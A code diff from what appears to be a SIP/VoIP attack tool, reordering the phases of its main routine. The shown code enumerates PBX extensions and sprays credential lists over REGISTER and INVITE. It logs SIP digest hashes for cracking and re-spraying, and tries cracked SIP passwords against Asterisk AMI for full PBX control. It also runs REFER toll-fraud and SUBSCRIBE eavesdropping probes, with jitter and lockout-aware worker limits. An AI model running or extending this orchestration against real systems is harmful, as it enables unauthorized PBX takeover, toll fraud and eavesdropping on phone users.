+        _phase(f"PHASE 5 · EXTENSION ENUMERATION  [{h.ip}]", col)
+        # (Moved before call test so confirmed creds feed into INVITE)
+        # ══════════════════════════════════════════════════════════════════
+
+        ami_dumped_exts: list[str] = (state.ami or {}).get("extensions") or []
+
+        if args.auto and not args.ext_range and not ami_dumped_exts:
+            auto_ranges = enumeration.ranges_for_fingerprint(state.fingerprint)
+            _info(
+                f"AUTO mode: using platform-specific ranges for {state.fingerprint}: {auto_ranges}",
+                col,
+            )
+
+        if args.enum:
+            if ami_dumped_exts:
+                ext_list = ami_dumped_exts
+                _info(f"Using {len(ext_list)} extensions from AMI dump (skip wordlist sweep).", col)
+                _jitter_sleep(args.jitter)
+                found = enumeration.sweep(
+                    h.ip, ext_list, port=sip_port,
+                    timeout=args.timeout, max_workers=args.workers,
+                    traffic_log=traffic_log,
+                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                )
+            elif args.ext_range:
+                ext_list = enumeration.expand_ext_range(args.ext_range)
+                _info(f"Enumerating {len(ext_list)} extensions from --ext-range...", col)
+                prog = Progress("REGISTER sweep", len(ext_list), col)
+                _jitter_sleep(args.jitter)
+                found = enumeration.sweep(
+                    h.ip, ext_list, port=sip_port,
+                    timeout=args.timeout, max_workers=args.workers,
+                    traffic_log=traffic_log, progress_cb=prog.tick,
+                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                )
+                prog.close()
+            else:
+                if args.full:
+                    ranges = enumeration.ranges_for_fingerprint(state.fingerprint)
+                    found_all: list[enumeration.ExtensionResult] = []
+                    seen_exts: set[str] = set()
+
+                    specials = enumeration.SPECIAL_EXTENSIONS[:]
+                    _jitter_sleep(args.jitter)
+                    sf = enumeration.sweep(
+                        h.ip, specials, port=sip_port,
+                        timeout=args.timeout, max_workers=args.workers,
+                        traffic_log=traffic_log,
+                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                    )
+                    for r in sf:
+                        if r.extension not in seen_exts:
+                            seen_exts.add(r.extension)
+                            found_all.append(r)
+                    if sf:
+                        _ok(f"Special extensions: {[r.extension for r in sf]}", col)
+
+                    prio_path = os.path.join(
+                        os.path.dirname(__file__), "wordlists", "extensions_priority.txt"
+                    )
+                    if os.path.exists(prio_path):
+                        with open(prio_path) as _pf:
+                            prio_list = [
+                                ln.strip() for ln in _pf
+                                if ln.strip() and not ln.startswith("#")
+                                and ln.strip() not in seen_exts
+                            ]
+                        _info(f"Priority sweep: {len(prio_list)} common extensions...", col)
+                        prog = Progress("Priority sweep", len(prio_list), col)
+                        _jitter_sleep(args.jitter)
+                        pf = enumeration.sweep(
+                            h.ip, prio_list, port=sip_port,
+                            timeout=args.timeout, max_workers=args.workers,
+                            traffic_log=traffic_log, progress_cb=prog.tick,
+                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                        )
+                        prog.close()
+                        for r in pf:
+                            if r.extension not in seen_exts:
+                                seen_exts.add(r.extension)
+                                found_all.append(r)
+                        if pf:
+                            _ok(f"Priority hits: {[r.extension for r in pf]}", col)
+
+                    _info(f"Fingerprint: {state.fingerprint} — adaptive sweep "
+                          f"over ranges {ranges} (filling gaps)...", col)
+                    for (lo, hi) in ranges:
+                        total_coarse = (hi - lo) // 10 + 1
+                        prog = Progress(f"{lo}-{hi}", total_coarse, col)
+                        _jitter_sleep(args.jitter)
+                        batch = enumeration.adaptive_sweep(
+                            h.ip, port=sip_port, low=lo, high=hi,
+                            timeout=args.timeout, max_workers=args.workers,
+                            traffic_log=traffic_log, progress_cb=prog.tick,
+                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                        )
+                        prog.close()
+                        for r in batch:
+                            if r.extension not in seen_exts:
+                                seen_exts.add(r.extension)
+                                found_all.append(r)
+                    found = found_all
+                else:
+                    ext_list = enumeration.expand_ext_range(f"file:{args.ext_wordlist}")
+                    _info(f"Enumerating {len(ext_list)} extensions from wordlist...", col)
+                    prog = Progress("REGISTER sweep", len(ext_list), col)
+                    _jitter_sleep(args.jitter)
+                    found = enumeration.sweep(
+                        h.ip, ext_list, port=sip_port,
+                        timeout=args.timeout, max_workers=args.workers,
+                        traffic_log=traffic_log, progress_cb=prog.tick,
+                        source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                    )
+                    prog.close()
+
+            if found:
+                _info(f"INVITE-probing {len(found)} extensions for anonymous-call acceptance...", col)
+                prog2 = Progress("INVITE probe", len(found), col)
+                _jitter_sleep(args.jitter)
+                inv_map = enumeration.probe_invite_acceptance(
+                    h.ip, [r.extension for r in found], port=sip_port,
+                    timeout=args.timeout, max_workers=args.workers,
+                    traffic_log=traffic_log, progress_cb=prog2.tick,
+                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                )
+                prog2.close()
+                for r in found:
+                    inv = inv_map.get(r.extension)
+                    if inv:
+                        r.anonymous_invite = r.anonymous_invite or inv.anonymous_invite
+                        r.auth_required    = r.auth_required and inv.auth_required
+
+            # Merge sweep results into state.extension_list (deduped)
+            for r in found:
+                existing_exts = {e["extension"] for e in state.extension_list}
+                if r.extension not in existing_exts:
+                    state.extension_list.append(asdict(r))
+                else:
+                    # Update existing entry with richer data from sweep
+                    for entry in state.extension_list:
+                        if entry["extension"] == r.extension:
+                            entry.update(asdict(r))
+                            break
+
+            anon = sum(1 for x in found if x.anonymous_invite)
+            open_reg = sum(1 for x in found if x.open_register)
+            _ok(f"{len(found)} extension(s) found — "
+                f"auth_required:{len(found)-anon}  "
+                f"anonymous_invite:{col.RED if anon else ''}{anon}{col.RESET if anon else ''}  "
+                f"open_register:{col.RED if open_reg else ''}{open_reg}{col.RESET if open_reg else ''}",
+                col)
+
+        # ── Phase 5 → spray adaptive injection (fallback) ─────────────────
+        # If enum found nothing but AMI dumped extensions, they were already
+        # added in _phase_ami_attack(); ensure the list is not empty for spray.
+        if not state.extension_list and ami_dumped_exts:
+            _info(
+                f"Adaptive: injecting {len(ami_dumped_exts)} AMI-dumped extension(s) "
+                f"into EXTENSION_LIST (enum skipped or found nothing).",
+                col,
+            )
+            state.add_extensions(ami_dumped_exts, source="ami_dump")
+
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 6 · CREDENTIAL SPRAY  [{h.ip}]", col)
+        # ══════════════════════════════════════════════════════════════════
+
+        # Auth-bypass CVE: if confirmed, run spray even with no extensions
+        # by injecting a synthetic probe list of common extension numbers.
+        if state.cve_auth_bypass_triggered and not state.extension_list:
+            _warn(
+                "[ADAPTIVE] Auth-bypass CVE confirmed with no enumerated extensions — "
+                "injecting synthetic probe list (1000–1010, 100–110) for spray",
+                col,
+            )
+            state.add_extensions(
+                [str(n) for n in list(range(1000, 1011)) + list(range(100, 111))],
+                source="synthetic",
+            )
+
+        if args.spray and state.extension_list:
+            creds = auth.load_credentials(args.cred_file)
+            if args.grandstream_creds or state.fingerprint == "Grandstream":
+                gs_path = os.path.join(os.path.dirname(args.cred_file), "grandstream.txt")
+                if os.path.exists(gs_path):
+                    creds.extend(auth.load_credentials(gs_path))
+
+            targets_for_spray = state.spray_targets()
+            if targets_for_spray:
+                # Bump workers to max on auth-bypass — target is already confirmed
+                # accessible; lockout risk is lower.
+                _spray_workers = (
+                    args.workers if state.cve_auth_bypass_triggered
+                    else min(args.workers, 10)
+                )
+                total_attempts = len(creds) * len(targets_for_spray)
+                _info(
+                    f"Spraying {len(creds)} cred pairs × {len(targets_for_spray)} "
+                    f"extension(s) = {total_attempts} attempts "
+                    f"(workers={_spray_workers}  max-failures={args.max_failures_per_ext}) "
+                    f"crack_pool_size={len(state.crack_pool)}",
+                    col,
+                )
+                if state.crack_pool:
+                    _info(
+                        f"  [ADAPTIVE] {len(state.crack_pool)} pre-cracked password(s) in "
+                        f"CRACK_POOL — promoted to front of spray queue",
+                        col,
+                    )
+                prog = Progress("Spray", len(targets_for_spray), col)
+                _jitter_sleep(args.jitter)
+                hits_spray = auth.spray(
+                    h.ip, targets_for_spray, creds,
+                    port=sip_port, timeout=args.timeout,
+                    max_workers=_spray_workers,
+                    max_failures_per_ext=args.max_failures_per_ext,
+                    traffic_log=traffic_log,
+                    source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                    ami_cracked_passwords=state.crack_pool,  # full pool, ordered
+                    hash_log_path=os.path.join(report_dir, "sip_hashes.txt"),
+                )
+                prog.close()
+                successes = [asdict(c) for c in hits_spray if c.success]
+                state.credentials_found = successes
+                for ext_hit in successes:
+                    state.confirmed_exts.add(ext_hit["extension"])
+                if successes:
+                    for c in successes:
+                        _finding(
+                            "critical",
+                            f"Cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
+                            f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
+                            col,
+                        )
+                else:
+                    _info("No credentials cracked via REGISTER spray.", col)
+
+                # Credential reuse: SIP password → AMI
+                if successes and state.ami and not state.ami.get("success"):
+                    _sip_passwords = list({c["password"] for c in successes if c.get("password")})
+                    if _sip_passwords:
+                        _info(f"Credential reuse: trying {len(_sip_passwords)} cracked SIP "
+                              f"password(s) against AMI...", col)
+                        for _pwd in _sip_passwords[:5]:
+                            for _user in ["admin", "asterisk",
+                                          successes[0].get("username", "admin")]:
+                                _reuse = ami.try_login(
+                                    h.ip, _user, _pwd,
+                                    port=args.ami_port, timeout=args.timeout,
+                                )
+                                if _reuse and _reuse.get("success"):
+                                    _warn(
+                                        f"AMI credential reuse: SIP password '{_pwd}' "
+                                        f"works on AMI as '{_user}'!",
+                                        col,
+                                    )
+                                    state.ami["reuse_hit"] = {"username": _user, "password": _pwd}
+                                    _finding(
+                                        "critical",
+                                        f"CREDENTIAL REUSE: SIP password '{_pwd}' grants "
+                                        f"AMI access as '{_user}' — full PBX control",
+                                        col,
+                                    )
+                                    break
+
+                # INVITE-based spray fallback (some PBXes skip REGISTER challenge)
+                if args.auto and not successes:
+                    invite_auth_exts = state.spray_targets()
+                    if invite_auth_exts:
+                        _info(
+                            f"AUTO mode: INVITE-based auth spray on "
+                            f"{len(invite_auth_exts)} extension(s)...",
+                            col,
+                        )
+                        _jitter_sleep(args.jitter)
+                        invite_hits = auth.spray(
+                            h.ip, invite_auth_exts, creds,
+                            port=sip_port, timeout=args.timeout,
+                            max_workers=min(args.workers, 10),
+                            max_failures_per_ext=args.max_failures_per_ext,
+                            traffic_log=traffic_log,
+                            source_ip=args.source_ip, tcp=sip_tcp, use_tls=sip_tls,
+                            method="INVITE",
+                            hash_log_path=os.path.join(report_dir, "sip_hashes.txt"),
+                        )
+                        invite_successes = [asdict(c) for c in invite_hits if c.success]
+                        if invite_successes:
+                            state.credentials_found.extend(invite_successes)
+                            for ext_hit in invite_successes:
+                                state.confirmed_exts.add(ext_hit["extension"])
+                            for c in invite_successes:
+                                _finding(
+                                    "critical",
+                                    f"INVITE spray cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
+                                    f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
+                                    col,
+                                )
+            else:
+                _info("No auth-required extensions to spray.", col)
+        elif args.spray:
+            _info("No extensions in EXTENSION_LIST — skipping credential spray.", col)
+
+        # ══════════════════════════════════════════════════════════════════
+        # PHASE 6b · HASH CRACK + RE-SPRAY
+        # Post-spray: crack any SIP Digest hashes collected during spray,
+        # extend CRACK_POOL, re-spray uncracked extensions with new passwords.
+        # ══════════════════════════════════════════════════════════════════
+
+        if args.spray and _CRACK_AVAILABLE:
+            _phase(f"PHASE 6b · HASH CRACK + RE-SPRAY  [{h.ip}]", col)
+            _phase_crack_hashes_and_respray(
+                state, args, col, sip_port, report_dir, traffic_log, source_port_range,
+            )
+
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 4 · TOLL-FRAUD CALL POC  [{h.ip}]", col)
+        # (Runs AFTER enum + spray so CONFIRMED_CREDS is fully populated)
+        # ══════════════════════════════════════════════════════════════════
 
         if args.call_test:
             call_from = args.call_from
             username = password = None
 
-            # Build ordered candidate list: cracked creds first, then anonymous/open exts
+            # Build ordered candidate list:
+            #   1. CONFIRMED_CREDS from spray (highest confidence — authenticated)
+            #   2. anonymous_invite / open_register extensions
+            #   3. anonymous probe (no creds at all — most dangerous misconfiguration)
             _call_candidates: list[tuple[str, str | None, str | None]] = []
-            for _c in hr["credentials_found"]:
+            for _c in state.credentials_found:
                 _call_candidates.append((_c["extension"], _c["username"], _c["password"]))
-            if hr["extensions"]:
-                _openish = [e for e in hr["extensions"]
-                            if e.get("anonymous_invite") or e.get("open_register")]
+            if state.extension_list:
+                _openish = [
+                    e for e in state.extension_list
+                    if e.get("anonymous_invite") or e.get("open_register")
+                ]
                 for _e in _openish:
                     _call_candidates.append((_e["extension"], None, None))
                 if _openish and args.auto:
@@ -1343,7 +2016,7 @@ def main() -> int:
 
             # --call-to-auto: override call_from with first AMI-discovered extension
             if args.call_to_auto:
-                ami_exts_for_auto = (hr.get("ami") or {}).get("extensions") or []
+                ami_exts_for_auto = (state.ami or {}).get("extensions") or []
                 if ami_exts_for_auto:
                     auto_from = ami_exts_for_auto[0]
                     _info(
@@ -1605,7 +2278,7 @@ def main() -> int:
                       f"success={result.success}", col)
                 _info(f"  {'─'*54}", col)
                 _info("", col)
-            hr["call_test"] = {
+            state.call_test = {
                 "call_to": effective_call_to, "call_from": call_from,
                 "success": result.success,
                 "reached_dialplan": result.reached_dialplan,
@@ -1691,7 +2364,7 @@ def main() -> int:
                     else:
                         _info(f"  {_wext}: rejected  [{status}]", col)
 
-                hr["call_test"]["weak_lines"] = _weak_lines
+                state.call_test["weak_lines"] = _weak_lines
                 _warn(f"{col.RED}{col.BOLD}{len(_weak_lines)} weak line(s) confirmed{col.RESET}: "
                       f"{_weak_lines}", col)
                 if len(_weak_lines) > 1:
@@ -1821,7 +2494,7 @@ def main() -> int:
         _phase(f"PHASE 4b · REFER / SUBSCRIBE PROBES  [{h.ip}]", col)
 
         # Auto-enable --check-refer when the Allow header advertises REFER or SUBSCRIBE
-        _allow_methods = (h.sip or {}).get("allow", []) if h.sip else []
+        _allow_methods = (state.sip or {}).get("allow", []) if state.sip else []
         _dangerous_in_allow = {"REFER", "SUBSCRIBE"} & {m.upper() for m in _allow_methods}
         if not getattr(args, "check_refer", False) and _dangerous_in_allow:
             _warn(
@@ -1836,8 +2509,8 @@ def main() -> int:
 
             # ── SUBSCRIBE presence/dialog-event eavesdrop probe ──────────
             _sub_exts = (
-                [e["extension"] for e in hr["extensions"][:3]]
-                if hr["extensions"]
+                [e["extension"] for e in state.extension_list[:3]]
+                if state.extension_list
                 else ["1000"]
             )
             _info(
@@ -1887,13 +2560,13 @@ def main() -> int:
                     col,
                 )
 
-            hr["subscribe_probes"] = _sub_results
+            state.subscribe_probes = _sub_results
 
             # ── REFER blind-transfer toll-fraud PoC ───────────────────────
             _refer_to = getattr(args, "refer_to", None) or args.call_to
             if _refer_to:
                 _refer_from = args.call_from or (
-                    hr["extensions"][0]["extension"] if hr["extensions"] else "1000"
+                    state.extension_list[0]["extension"] if state.extension_list else "1000"
                 )
                 _info(
                     f"REFER blind-transfer PoC: from={_refer_from} "
@@ -1911,7 +2584,7 @@ def main() -> int:
                     source_ip=args.source_ip,
                     source_port_range=source_port_range,
                 )
-                hr["refer_probe"] = _refer_result
+                state.refer_probe = _refer_result
                 if _refer_result["is_vulnerable"]:
                     _finding(
                         "critical",
@@ -1934,10 +2607,9 @@ def main() -> int:
                 col,
             )
 
-        # ══════════════════════════════════════════════════════════════════
-        _phase(f"PHASE 5 · EXTENSION ENUMERATION  [{h.ip}]", col)
-
-        ami_dumped_exts: list[str] = (hr.get("ami") or {}).get("extensions") or []
+        # Phase 5 extension enumeration block was moved above the call test
+        # (now runs as part of the Phase 5 block inserted before Phase 4).
+        # The ami_dumped_exts variable is still accessible from the moved block.
 
         # In --auto mode, use platform-specific extension ranges after fingerprinting
         if args.auto and not args.ext_range and ami_dumped_exts == []:
@@ -2101,24 +2773,10 @@ def main() -> int:
                       "extensions with no credentials.", col)
 
 
-        # ══════════════════════════════════════════════════════════════════
-        _phase(f"PHASE 6 · CREDENTIAL SPRAY  [{h.ip}]", col)
-
-        # Adaptive injection: if enum phase was skipped but AMI dumped extensions,
-        # synthesise extension records so the spray phase has targets.
-        if not hr["extensions"] and ami_dumped_exts:
-            _info(
-                f"Adaptive: injecting {len(ami_dumped_exts)} AMI-dumped extension(s) "
-                f"into spray targets (enum phase was skipped or found nothing).",
-                col,
-            )
-            hr["extensions"] = [
-                {"extension": e, "auth_required": True, "anonymous_invite": False,
-                 "open_register": False, "source": "ami_dump"}
-                for e in ami_dumped_exts
-            ]
-
-        if args.spray and hr["extensions"]:
+        # Phase 6 credential spray block was moved above the call test
+        # (now runs as part of the Phase 6 block inserted before Phase 4).
+        # The following guard prevents a double-run on any old code path:
+        if False and args.spray and state.extension_list:  # DEAD — kept for diff clarity
             creds = auth.load_credentials(args.cred_file)
             if args.grandstream_creds or h.fingerprint == "Grandstream":
                 gs_path = os.path.join(os.path.dirname(args.cred_file), "grandstream.txt")
@@ -2226,7 +2884,7 @@ def main() -> int:
             _info("No extensions found — skipping credential spray.", col)
 
 
-        host_reports.append(hr)
+        host_reports.append(state.to_host_report())
 
     # ══════════════════════════════════════════════════════════════════════
     _phase("REPORT", col)
